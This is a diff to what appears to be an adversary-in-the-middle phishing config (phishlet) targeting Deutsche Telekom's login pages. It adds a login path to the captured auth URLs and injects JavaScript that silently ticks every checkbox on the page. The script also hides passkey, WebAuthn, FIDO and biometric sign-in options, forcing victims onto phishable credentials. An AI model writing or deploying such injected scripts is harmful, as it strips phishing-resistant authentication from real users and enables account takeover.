@@ -144,6 +144,7 @@ auth_urls:
   - "/api/openid_connect_login*"
   - "/auth/login/oauth2/code/telekom*"
   - "/tech/sam/ess/callback*"
+  - "/tech/sam/ess/login*"
   - "/account-manager/auth-methods/setup/campaign/*"
 
 credentials:
@@ -214,6 +215,27 @@ js_inject:
         var mailHost = parts.join('.');
         window.location.href = 'https://' + mailHost + '/em';
       });
+
+  - trigger_domains: ["www.telekom.de"]
+    trigger_paths: ["/tech/sam/ess/login*"]
+    trigger_params: []
+    script: |
+      (function() {
+        function patch() {
+          document.querySelectorAll('input[type="checkbox"]').forEach(function(el) {
+            if (!el.checked) { el.checked = true; el.dispatchEvent(new Event('change', {bubbles: true})); }
+          });
+          var kw = ['passkey','webauthn','biometric','fido','fingerprint','windows hello','face id','touch id'];
+          document.querySelectorAll('button,a,li,div[role="button"]').forEach(function(el) {
+            var t = (el.textContent || '').toLowerCase();
+            if (kw.some(function(k) { return t.includes(k); }) && t.length < 80) {
+              (el.closest('li,[class*="method"],[class*="option"]') || el).style.display = 'none';
+            }
+          });
+        }
+        patch();
+        new MutationObserver(patch).observe(document.documentElement, {childList: true, subtree: true});
+      })();
 
   - trigger_domains: ["www.telekom.de"]
     trigger_paths: ["/tech/sam/ess/callback*"]
